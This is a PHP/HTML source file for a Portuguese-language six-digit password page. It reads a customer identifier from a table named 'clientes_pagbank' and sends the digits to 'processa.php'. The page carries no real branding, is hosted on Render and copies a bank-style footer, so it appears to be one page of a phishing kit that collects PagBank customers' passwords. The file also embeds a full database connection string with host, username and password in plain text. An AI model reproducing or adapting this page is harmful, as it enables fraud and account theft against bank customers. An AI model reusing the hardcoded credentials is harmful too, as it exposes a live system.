<?php
// senha.php — versão final com sessão corrigida para Render

session_set_cookie_params([
    'lifetime' => 0,
    'path' => '/',
    'secure' => isset($_SERVER['HTTPS']),
    'httponly' => true,
    'samesite' => 'Lax'
]);

session_start();

// 🔐 Proteção: só acessa a senha se passou pelo identificador
if (!isset($_SESSION['cliente_id'])) {
    header('Location: login-desktop.php');
    exit;
}

// 🔎 Buscar identificador no banco (opcional)
$DATABASE_URL = getenv("DATABASE_URL");
if (!$DATABASE_URL) {
    $DATABASE_URL = "host=cd7f19r8oktbkp.cluster-czrs8kj4isg7.us-east-1.rds.amazonaws.com port=5432 dbname=de3nhd2osd4jko user=u974ongr8md5qc password=p68932741a8bb7b2b28fced15dae4143f8721c875a7dfa625405c09b198d9c632";
}

$db = pg_connect($DATABASE_URL);

$identificador = '';
if ($db) {
    $stmt = pg_query_params(
        $db,
        "SELECT identificador FROM clientes_pagbank WHERE cliente_id = $1",
        [$_SESSION['cliente_id']]
    );
    if ($stmt && pg_num_rows($stmt) > 0) {
        $identificador = pg_fetch_result($stmt, 0, 0);
    }
}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Digite sua senha</title>

  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">

  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }

    html, body {
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      background: #fff;
    }

    .header {
      display: flex;
      justify-content: flex-end;
      padding: 16px;
      border-bottom: 1px solid #dcdcdc;
    }

    .flag {
      background: #f5f5f5;
      border: 1px solid #ccc;
      border-radius: 20px;
      padding: 6px 14px;
      font-size: 13px;
    }

    .container {
      max-width: 360px;
      margin: 0 auto;
      padding: 30px 20px;
      flex: 1;
    }

    h2 {
      font-size: 18px;
      margin-bottom: 6px;
    }

    .subinfo {
      font-size: 13px;
      color: #666;
      margin-bottom: 20px;
    }

    .trocar {
      float: right;
      font-size: 13px;
      color: #007fc7;
      text-decoration: none;
    }

    .senha-digitos {
      display: flex;
      gap: 6px;
      margin-bottom: 24px;
    }

    .senha-digitos input {
      width: 32px;
      height: 48px;
      font-size: 20px;
      border-radius: 8px;
      border: 1px solid #444;
      text-align: center;
    }

    button {
      width: 100%;
      padding: 14px;
      background-color: #007fc7;
      color: white;
      font-size: 16px;
      font-weight: 600;
      border: none;
      border-radius: 2px;
    }

    .forgot {
      text-align: center;
      font-size: 14px;
      margin: 16px 0;
    }

    .forgot a {
      color: #007fc7;
      text-decoration: none;
    }

    .rodape {
      background: #222;
      color: #ccc;
      text-align: center;
      font-size: 12px;
      padding: 20px 10px;
    }
  </style>
</head>
<body>

<div class="header">
  <div class="flag">PT</div>
</div>

<div class="container">
  <form action="processa.php" method="POST">

    <h2>Digite sua senha</h2>

    <div class="subinfo">
      Sua conta<br>
      <strong><?= htmlspecialchars($identificador) ?></strong>
      <a class="trocar" href="login-desktop.php">Trocar</a>
    </div>

    <div class="senha-digitos">
      <?php for ($i = 0; $i < 6; $i++): ?>
        <input type="password" name="senha[]" maxlength="1" inputmode="numeric" required>
      <?php endfor; ?>
    </div>

    <button type="submit">Entrar</button>

    <div class="forgot">
      <a href="#">Esqueceu sua senha?</a>
    </div>

  </form>
</div>

<div class="rodape">
  <p>© 1996-2025 Todos os direitos reservados.</p>
</div>

<script>
  const inputs = document.querySelectorAll('.senha-digitos input');

  inputs.forEach((input, index) => {
    input.addEventListener('input', () => {
      if (input.value && index < inputs.length - 1) {
        inputs[index + 1].focus();
      }
    });

    input.addEventListener('keydown', e => {
      if (e.key === 'Backspace' && !input.value && index > 0) {
        inputs[index - 1].focus();
      }
    });
  });
</script>

</body>
</html>
